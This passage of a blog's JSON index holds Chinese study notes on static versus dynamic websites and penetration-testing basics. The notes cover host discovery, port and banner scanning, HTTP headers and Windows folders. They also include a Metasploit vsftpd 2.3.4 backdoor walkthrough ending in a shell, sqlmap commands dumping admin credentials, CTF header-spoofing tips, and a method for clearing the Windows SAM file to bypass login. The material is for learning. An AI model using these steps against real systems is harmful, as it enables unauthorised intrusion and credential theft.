最常见的网站是PHP和Java语言做的网站了，PHP开发速度快于Java，PHP能够快速的搭建环境，以及编辑一个页面。 静态网站是指全部由HTML（标准通用标记语言的子集）代码格式页面组成的网站，所有的内容包含在网页文件中。网页上也可以出现各种视觉动态效果，如GIF动画，FLASH动画，滚动字幕等，而网站主要是静态化的页面和代码组成，一般文件名均以htm，html，shtml等为后缀。 注意HTML是标记语言而非编程语言 关于标记语言与编程语言 标记语言，是一种将文本（Text）以及文本相关的其他信息结合起来，展现出关于文档结构和数据处理细节的电脑文字编码。与文本相关的其他信息（包括例如文本的结构和表示信息等）与原来的文本结合在一起，但是使用标记（markup）进行标识。 编译型语言：程序在执行之前需要一个专门的编译过程，把程序编译成 为机器语言的文件，运行时不需要重新翻译，直接使用编译的结果就行了。程序执行效率高，依赖编译器，跨平台性差些，标记语言不用于向计算机发出指令，常用于格式化和链接。 编译型语言写的程序执行之前，需要一个专门的编译过程，把程序编译成为机器语言的文件，比如exe文件，以后要运行的话就不用重新翻译了，直接使用编译的结果就行了（exe文件），因为翻译只做了一次，运行时不需要翻译，所以编译型语言的程序执行效率高。 两者最简单的区别在于，编程语言有逻辑和行为能力，而标记语言没有。 静态网站的安全性是要比动态网站更高的，因为静态网站本身没有与服务器的数据交互。 动态网站并不是指具有动画功能的网站，而是指网站内容可根据不用情况动态变更的网站，一般情况下动态网站通过数据库进行架构，动态网站除了要设计网页外，还要童工数据库和编程序来使网站具有更多自动的和高级的功能。动态网站体现在网页一般是以asp，jsp，php，aspx等结束，而静态网页一般是以HTML（标准通用标记语言的子集）结尾，动态网站服务器空间配置要比静态的网页要求高，费用也相应的高，不过动态网页利于网站内容的更新，适合企业建站，动态是相对于静态而言。由动态的脚本编写，需要后台数据库支持。 静态与动态的区别 静态网站用于发布，比如发布一些文章，他不需要用户进行注册；动态则像是论坛，或者淘宝之类，有着大量数据流通的网站，我们判断一个网站属于静态还是动态，就直接在网站后面看他是什么结尾的就好了 那么结尾没有显示脚本语言子集怎么办呢 我们可以在网址后面，加上一个指令：index 比如index.html，如果没有报错，那么我们就可以证明这就是一个html网站 基于这个方法我们甚至可以判断这个网站是windows系统还是linux系统，这里使用的是linux系统对大小写敏感的问题 比如你对一个html网站跟上index.Html，这个时候如果没报错，就是windows系统，如果报错，就是linux系统，因为Html这个写法linux无法识别 那么还有一种情况，伪静态 对于有些网站，你删除网址最后的html，或者改成php，或者一些其他的“在网址上让其不从属于静态网站”的操作时，他不会报错，依然可以正常显示网页内容，这样的网站就是伪静态网站。 伪静态是相对真实静态来讲的，通常我们为了增强搜索引擎的友好面，都将文章内容生成静态页面，但是有的朋友为了实时的显示一些信息。或者还想运用动态脚本解决一些问题。不能用静态的方式来展示网站内容。但是这就损失了对搜索引擎的友好面。怎么样在两者之间找个中间方法呢，这就产生了伪静态技术。就是展示出来的是以html一类的静态页面形式，但其实是用ASP一类的动态脚本来处理的 ","link":"https://ro1ing.github.io/post/jing-tai-wang-zhan-he-dong-tai-wang-zhan-de-qu-bie/"},{"title":"渗透基础学习笔记","content":"主机发现学习笔记(一) 首先先要了解协议中的栈分层 OSI （Open System Interconnect），即开放式系统互联。 应用层：给应用提供服务。 表示层：确保从设备的应用层发出的数据可以被另一个设备应用层理解，把文件转换成bit流。 会话层：建立、管理、终止表示层实体和传输层间的通信会话。 传输层：流控、检错、纠错和端到端通信。 网络层：tcp/ip的实现、路由功能。 数据链路层：控制物理层的协议。 物理层：电器和机械方面。 TCP/IP 应用层：是网络应用程序及其应用层协议存留的层次。该层包括了所有与网络相关的高层协议，如文件传输协议（FTP）、超文本传输协议（HTTP）、远程终端协议（Telent)、简单邮件传送协议（SMTP)、因特网中继聊天（IRC)等。 传输层：使源端主机和目标端主机上的对等实体可以进行会话。该层有两种服务质量不同的协议：传输控制协议（TCP）和用户数据报协议（UDP）。 互联网层：通过路径选择把分组发往目标网络或主机，进行网络拥塞控制以及差错控制，是整个TCP/IP协议栈的核心。 网络访问层：负责网络层和物理层之间的通信，将网络层接收到的数据分割成特定的可被物理层传输的帧，并让物理层进行实际的数据传送。 二层主机发现 二层主机发现指：利用ISO中链路层中的协议进行主机发现。一般使用ARP协议。 优点：（局域网中通信使用ARP协议，利用MAC地址作为对应的识别地址） 1、速度快 2、可靠性高 缺点： 无法扫描经过路由的主机 扫描工具 arping Kali自带； 缺点：只能对单个主机多次扫描。 netdiscover Kali自带； 针对特定的子网进行多主机。 三层主机发现 三层主机发现指：利用ISO中网络中的协议进行主机发现。一般使用ICMP协议。 优点： 1、可以发现远程主机 经过路由的主机 2、速度相对比较快 缺点： 1、经常被防火墙过滤 2、速度相比二层发现慢 扫描工具 ping ping IP地址 Linux和windows都有自带， Linux下ping如果不指定-c参数，一直扫描。Windows下默认进行四次探测。 fping fping -g IP地址/端口号 Kali自带; 可以针对多个主机同时进行主机发现。 hping3 hping3 -h //修改ICMP相关指令 hping3 -c 扫描次数 --icmp IP地址 Kali自带； 可以发送自定义 ICMP数据包 。 四层主机发现 四层发现指利用OSI中的传输层协议进行主机发现，一般使用TCP、UDP探测。 优点： 1、可探测远程主机 2、比三层发现更为可靠 缺点： 花费时间更长 扫描工具 nmap nmap IP地址 Kali自带； 可以进行二、三、四层的探测 。 hping3 hping3 --udp -c 3 -p端口号 IP地址 //--udp 使用udp进行探测 -c 使用3次 默认端口为零 浏览器默认端口为80 Kali自带； 可以进行对应的四层层主机发现。 Python脚本-nWatch 安装：pip install python-nmap 漏洞扫描学习笔记(一) 漏洞扫描原理 漏洞扫描器对漏洞进行扫描，以验证具体目标是否存在对应的具体漏洞。但是也存在错误扫描，需要对扫描结果进行漏洞验证。 其实扫描器的原理大致相同都是通过发送对应的验证数据到目标具体服务进行验证。当收到目标返回的响应与存在漏洞的响应一致时，就表明存在漏洞。 漏洞扫描工具 Nmap nmap --script vuln 目标IP地址 Nessus 系统漏洞扫描 **Metasploit **对扫描到的漏洞加以利用 以vsftpd2.3.4为例 search vsftpd 得到 use (复制粘贴上面的路径) show payloads set payload cmd/unix/interact //上面展示的路径 show options 设置所用的参数 set rhost（上面name下面的） ip show options 观察是否设置成功 exploit 溢出 得到shell web应用程序漏洞扫描 针对web应用程序的漏洞扫描其实就是每个扫描器读取自己的payload进行探测 常见Web漏洞扫描器： 1.Owasp-zap 2.awvs 3.appscan 4.nikto 5.Burpsuite 每个扫描器都有各自不同的payload探测 Woasp-zap kali自带 直接输入url攻击即可 Nikto nikto -host IP地址 对目标服务器进行漏洞扫描 主要针对HTTP服务器 漏洞利用 Sqlmap 对扫描到的sql注入漏洞进行利用 在owasp-zap 扫到的sql漏洞复制出 在浏览器里粘贴 修改不为sql报错信息 然后在终端内 sqlmap -u &quot;url&quot; sqlmap -u &quot;url&quot; -T admin --columns sqlmap -u &quot;url&quot; -T admin -C &quot;admin,passwprd&quot; --dump获取对应数据 然后密文解密 得到shell 端口扫描学习笔记(一) 端口的基本介绍 &quot;端口&quot;是英文port的意译，可以认为是设备与外界通讯交流的出口。端口可分为虚拟端口和物理端口，其中虚拟端口指计算机内部或交换机路由器内的端口，不可见。例如计算机中的80端口、21端口、23端口等。物理端口又称为接口，是可见端口，计算机背板的RJ45网口，交换机路由器集线器等RJ45端口。电话使用RJ11插口也属于物理端口的范畴。 一台拥有IP地址的主机可以提供许多服务，比如： Web服务、FTP服务、SMTP服务等，这些服务完全可以通过1个IP地址来实现。那么，主机是怎样区分不同的网络服务呢？显然不能只靠IP地址，因为IP 地址与网络服务的关系是一对多的关系。实际上是通过“IP地址+端口号”来区分不同的服务的。因此 ，一个开放的端口代表一个提供的服务，不同的服务具有不同的端口号，因此要对此服务进行测试，首先要确定是否开放对应端口号。 端口扫描工具 Nmap nmap IP地址 Dmitry 其中-p参数指定dmitry进行tcp端口扫描。 dmitry -p IP地址 相对 nmap 扫描端口较少，因为只会扫描常用端口 netcat -nc -nvz ip地址 端口范围 例 ： -nc -nvz 192.168.xxx.xxx 20-30 端口的分类： 端口号的范围是从1～65535 //2的16次方 端口分类 端口范围 0-65535 TCP端口和UDP端口。由于TCP和UDP 两个协议是独立的，因此各自的端口号也相互独立，比如TCP有235端口，UDP也 可以有235端口，两者并不冲突。 端口分为： 1、周知端口 周知端口是众所周知的端口号，范围从0到1023，其中80端口分配给WWW服务，21端口分配给FTP服务等。我们在IE的地址栏里输入一个网址的时候是不必指定端口号的，因为在默认情况下WWW服务的端口是“80”。它们紧密绑定于一些服务，通常这些端口的通讯明确表明了某种服务的协议，如：80端口对应与HTTP通信，21端口绑定与FTP服务，25端口绑定于SMTP服务，135端口绑定与RPC（远程过程调用）服务。 2、动态端口 动态端口的范围是从49152到65535。之所以称为动态端口，是因为它 一般不固定分配某种服务，而是动态分配。理论上，不应为服务分配这些端口，通常机器从1024开始分配动态端口。例外：SUN的RPC端口从32768开始。 可能会被木马攻击，等待端口的分配 3、注册端口 端口1024到49151，分配给用户进程或应用程序。这些进程主要是用户安装的程序。它们松散的绑定于一些服务，也就是说有许多服务绑定于这些端口，这些端口同样用于其他许多目的，如：许多系统处理端口从1024开始 获取端口Banner信息工具 Nmap扫描指定主机的端口信息，并返回Banner nmap IP地址 -p 端口号 --script banner Dmitry 获取端口信息 dmitry -pb IP地址 Netcat 获取banner信息 nc -vn IP地址 端口号 Nmap获取目标系统的端口版本信息 nmap -p 端口号 -sV IP地址 Nmap扫描指定主机的操作系统版本 nmap -O IP地址 Http协议学习笔记(一) 什么是HTTP？ ​ 互联网应用最广泛的一种网络协议，所有www文件必须遵守这个标准，设计最初目的是为了提供一种发布和接受HTML页面的方法。 超文本传输协议，是一个基于请求与响应，无状态的，应用层的协议，常基于TCP/IP协议传输数据，互联网上应用最为广泛的一种网络协议,所有的WWW文件都必须遵守这个标准。设计HTTP的初衷是为了提供一种发布和接收HTML页面的方法。 HTTP由两部分组成：请求和响应。当你在Web浏览器中输入一个URL时，浏览器将根据你的要求创建并发送请求，该请求包含所输入的URL以及一些与浏览器本身相关的信息。当服务器收到这个请求时将返回一个响应，该响应包括与该请求相关的信息以及位于指定URL（如果有的话）的数据。直到浏览器解析该响应并显示出网页（或其他资源）为止。 常见的请求头： Accept：浏览器可接受的MIME类型。 Accept - Charset：浏览器可接受的字符集。 Accept - Encoding：浏览器能够进行解码的数据编码方式，比如gzip。Servlet能够向支持gzip的浏览器返回经gzip编码的HTML页面。许多情形下这可以减少5到10倍的下载时间。 Accept - Language：浏览器所希望的语言种类，当服务器能够提供一种以上的语言版本时要用到。 Authorization：授权信息，通常出现在对服务器发送的WWW - Authenticate头的应答中。 Connection：表示是否需要持久连接。如果Servlet看到这里的值为“Keep - Alive”，或者看到请求使用的是HTTP 1.1（HTTP 1.1默认进行持久连接），它就可以利用持久连接的优点，当页面包含多个元素时（例如Applet，图片），显著地减少下载所需要的时间。要实现这一点，Servlet需要在应答中发送一个Content - Length头，最简单的实现方法是：先把内容写入ByteArrayOutputStream，然后在正式写出内容之前计算它的大小。 Content - Length：表示请求消息正文的长度。 Cookie：这是最重要的请求头信息之一，参见后面《Cookie处理》一章中的讨论。 From：请求发送者的email地址，由一些特殊的Web客户程序使用，浏览器不会用到它。 Host：初始URL中的主机和端口。 If - Modified - Since：只有当所请求的内容在指定的日期之后又经过修改才返回它，否则返回304“Not Modified”应答。 Pragma：指定“no - cache”值表示服务器必须返回一个刷新后的文档，即使它是代理服务器而且已经有了页面的本地拷贝。 Referer：包含一个URL，用户从该URL代表的页面出发访问当前请求的页面。 User - Agent：浏览器类型，如果Servlet返回的内容与浏览器类型有关则该值非常有用。 UA - Pixels，UA - Color，UA - OS，UA - CPU：由某些版本的IE浏览器所发送的非标准的请求头，表示屏幕大小、颜色深度、操作系统和CPU类型。 什么是HTTPS？ 《图解HTTP》这本书中曾提过HTTPS是身披SSL外壳的HTTP。HTTPS是一种通过计算机网络进行安全通信的传输协议，经由HTTP进行通信，利用SSL/TLS建立全信道，加密数据包。HTTPS使用的主要目的是提供对网站服务器的身份认证，同时保护交换数据的隐私与完整性。 PS:TLS是传输层加密协议，前身是SSL协议，由网景公司1995年发布，有时候两者不区分。 常见考点： HTTP Method HTTP Method是可以自定义的，且区分大小写。 HTTP/1.1协议中共定义了八种方法（有时也叫“动作”）来表明Request-URI指定的资源的不同操作方式： OPTIONS 返回服务器针对特定资源所支持的HTTP请求方法。也可以利用向Web服务器发送'*'的请求来测试服务器的功能性。 HEAD 向服务器索要与GET请求相一致的响应，只不过响应体将不会被返回。这一方法可以在不必传输整个响应内容的情况下，就可以获取包含在响应消息头中的元信息。 GET 向特定的资源发出请求。注意：GET方法不应当被用于产生“副作用”的操作中。 POST 向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST请求可能会导致新的资源的建立和/或已有资源的修改。 PUT 向指定资源位置上传其最新内容。 DELETE 请求服务器删除Request-URI所标识的资源。 TRACE 回显服务器收到的请求，主要用于测试或诊断。 CONNECT HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器。 CTF 1.要求从某个IP或者主机访问，一般是修改 X-Forwarded-For，X-Forwarded-Host，CLIENT-IP,host的参数的值 2.要求从某个国家访问，一般修改Accept-Language值 3.要求从某个页面访问就修改referer，有关身份认证类的一般再修改cookie的值 Windows基础学习笔记(一) C盘根目录常见文件夹 Documents and Settings/用户： Windows7中的“用户”文件夹其实就是XP中的 Documents andSettings文件夹，这里储存了用户的设置，包括用户文档、上网浏览信息、配置文件等数据。 Downloads：这通常是下载软件的默认下载路径， 建议修改软件设置改到其他硬盘分区。 Drivers：部分驱动程序的文件夹。在etc中，用文本打开其中的hosts，其中的资料主要用来解析域名。 Favorites：收藏夹。 Program Files：应用程序文件夹，一般软件默认都安装在这里，也有一些系统自带的应用程序。Windows7系统中，64位用户会多出一个 ProgramFies（X86）文件夹，这是系统中32位软件的安装目录 Common Files：共用程序文件夹，用于同系列不同程序软件共同使用或调用数据，比如微软和Adob的各种软件。 ComPlus Applications：微软COM+组件使用的文件夹，删除后可能引起COM+组件不能运行。 DFX：DFX是一种高效的XML索引方法，此文件夹与数据索引有关，不可以删除。 Program Data： Windows7的系统文件夹，放置程序的使用数据、设置等文件，不建议删除。Windows：存放操作系统主要文件，非常重要。 Temp：存放系统或其他软件临时文件，需经常清理 hiberfil.sys：系统的休眠功能所占用的硬盘空间的文件，不建议删除。 pagefile.sys：虛拟内存页面文件，不建议删除。 PerfLogs： Windows vista或 Windows7系统日志，记录如磁盘扫描错误等信息，没有必要删除。 Internet Explorer：系统自带的浏览器，删除后可能导致部分程序不能正常运行。 Install Shield Installation Information：专门存储安装程序信息的文件夹，用于某些程序的卸载和更新。 MSECache： MS Office运行时自动创建。 MSXML60：微软ⅩML解析器程序的文件夹。 microsoft frontpage： FrontPage是微软推出的款网页设计软件，此文件夹通常为空。 Movie maker：系统自带的一款视频编辑软件。 MSN Gaming Zone：一些系统自带的扑克牌等小游戏，可以删除。 Netmeeting：系统自带的网上聊天软件。 Outlook Express： Outlook Express WIndows内置的邮件收发端，不用可删。 Online Services：网络服务文件夹，不能删。 Windows Media Player：系统自带的一款多媒体播放器。 WinRAR：一款流行的压缩解压缩软件。 Xerox：用作自带的一些图像处理软件的临时空间，文件夹不能删除，但通常为空。 system32 --保存系统的配置文件 System\\config下有一个SAM文件，这个文件就是用来保存用户的账号和密码的 对于win10系统来说，进到这个目录，首先就需要管理员权限，其次就算你进来了，这种东西都是一个被锁定的文件，在系统启动的时候他就已经被系统调动了，如果你想打开这个文件，电脑首先就会显示此文件已经被占用，具体的显示内容为“另一个程序正在使用此文件，进程无法访问。假设现在我们需要尝试渗透一个系统的一块软件数据，那么我们首先就要登陆进这个系统，打开软件才能拷贝数据，而且进去还不能靠改他的密码，这种解决方法就是，首先把SAM拷贝出来一份，然后用PE工具把他清掉，再登录系统的时候就可以不需要密码了，然后该做什么做什么，做完了以后重新进入PE，把之前我们备份的SAM再放进去。其实PE本身已经足够我们直接进入系统，但我们要知道，如果没有最终以用户的形式进入那个系统的话，我们就算找到了那个软件，那个软件本身也是不可读的，所以还是要有这种先将用户密码清除在从用户进入的过程。 Windows常见服务 Web服务，DNS服务，DHCP服务，邮件服务，Telnet服务，SSH服务，FTP服务，SMB服务 Web服务 Web服务是一种服务导向架构的技术，通过标准的Web协议提供服务，目的是保证不同平台的应用服务可以互操作。根据W3C的定义，Web服务（Web service）应当是一个软件系统，用以支持网络间不同机器的互动操作。网络服务通常是许多应用程序接口（API）所组成的，它们透过网络，例如国际互联网（Internet）的远程服务器端，执行客户所提交服务的请求。Web service是一个平台独立的，低耦合的，自包含的、基于可编程的web的应用程序，可使用开放的XML（标准通用标记语言下的一个子集）标准来描述、发布、发现、协调和配置这些应用程序，用于开发分布式的互操作的应用程序。 https://blog.csdn.net/Z_Grant/article/details/90650111 DNS服务 IP地址电脑理解不了URL域名，在这种情况下，使用dns服务。 DHCP服务 动态主机设置协议（英语：Dynamic Host Configuration Protocol**，DHCP**）是一个局域网的网络协议，使用UDP协议工作，主要有两个用途：用于内部网或网络服务供应商自动分配IP地址；给用户用于内部网管理员作为对所有计算机作中央管理的手段。 Telnet服务 Telnet协议是TCP/IP协议族中的一员，是Internet远程登录服务的标准协议和主要方式。它为用户提供了在本地计算机上完成远程主机工作的能力。在终端使用者的电脑上使用telnet程序，用它连接到服务器。终端使用者可以在telnet程序中输入命令，这些命令会在服务器上运行，就像直接在服务器的控制台上输入一样。可以在本地就能控制服务器。要开始一个telnet会话，必须输入用户名和密码来登录服务器。Telnet是常用的远程控制Web服务器的方法。 SSH服务 多用于Linux，与telnet类似，SSH 为 [Secure Shell](https://baike.baidu.com/item/Secure Shell) 的缩写，由 IETF 的网络小组（Network Working Group）所制定；SSH 为建立在应用层基础上的安全协议。SSH 是目前较可靠，专为远程登录会话和其他网络服务提供安全性的协议。利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题。SSH最初是UNIX系统上的一个程序，后来又迅速扩展到其他操作平台。SSH在正确使用时可弥补网络中的漏洞。SSH客户端适用于多种平台。几乎所有UNIX平台—包括HP-UX、Linux、AIX、Solaris、Digital UNIX、Irix，以及其他平台，都可运行SSH。传统的网络服务程序，如：ftp、pop和telnet在本质上都是不安全的，因为它们在网络上用明文传送口令和数据，别有用心的人非常容易就可以截获这些口令和数据。而且，这些服务程序的安全验证方式也是有其弱点的， 就是很容易受到“中间人”（man-in-the-middle）这种方式的攻击。所谓“中间人”的攻击方式， 就是“中间人”冒充真正的服务器接收你传给服务器的数据，然后再冒充你把数据传给真正的服务器。服务器和你之间的数据传送被“中间人”转手做了手脚之后，就会出现很严重的问题。通过使用SSH，你可以把所有传输的数据进行加密，这样&quot;中间人&quot;这种攻击方式就不可能实现了，而且也能够防止DNS欺骗和IP欺骗。使用SSH，还有一个额外的好处就是传输的数据是经过压缩的，所以可以加快传输的速度。SSH有很多功能，它既可以代替Telnet，又可以为FTP、PoP、甚至为PPP提供一个安全的&quot;通道&quot; 从客户端来看，SSH提供两种级别的安全验证。 首先是基于口令的安全验证，只要你知道自己的帐号和口令，就可以登录到远程主机。所有传输的数据都会被加密，但是不能保证你正在连接的服务器就是你想连接的服务器。可能会有别的服务器在冒充真正的服务器，也就是受到“中间人”这种方式的攻击。其次是基于密钥的安全验证，这需要依靠密匙，也就是你必须为自己创建一对密匙，并把公用密匙放在需要访问的服务器上。如果你要连接到SSH服务器上，客户端软件就会向服务器发出请求，请求用你的密匙进行安全验证。服务器收到请求之后，先在该服务器上你的主目录下寻找你的公用密匙，然后把它和你发送过来的公用密匙进行比较。如果两个密匙一致，服务器就用公用密匙加密“质询”（challenge）并把它发送给客户端软件。客户端软件收到“质询”之后就可以用你的私人密匙解密再把它发送给服务器。用这种方式，你必须知道自己密匙的口令。但是，与第一种级别相比，第二种级别不需要在网络上传送口令。 第二种级别不仅加密所有传送的数据，而且“中间人”这种攻击方式也是不可能的（因为他没有你的私人密匙）。但是整个登录的过程可能需要10秒。 FTP服务 即文件传输协议（英文：File Transfer Protocol，缩写：FTP）是用于在网络上进行文件传输的一套标准协议，使用客户/服务器模式。它属于网络传输协议的应用层。文件传送（file transfer）和文件访问（file access）之间的区别在于：前者由FTP提供，后者由如NFS等应用系统提供 TCP/IP协议中，FTP标准命令TCP端口号为21，Port方式数据端口为20。FTP的任务是从一台计算机将文件传送到另一台计算机，不受操作系统的限制。 需要进行远程文件传输的计算机必须安装和运行ftp客户程序。在windows操作系统的安装过程中，通常都安装了tcp/ip协议软件，其中就包含了ftp客户程序。但是该程序是字符界面而不是图形界面，这就必须以命令提示符的方式进行操作，很不方便。 ","link":"https://ro1ing.github.io/post/shen-tou-ji-chu-xue-xi-bi-ji/"}]}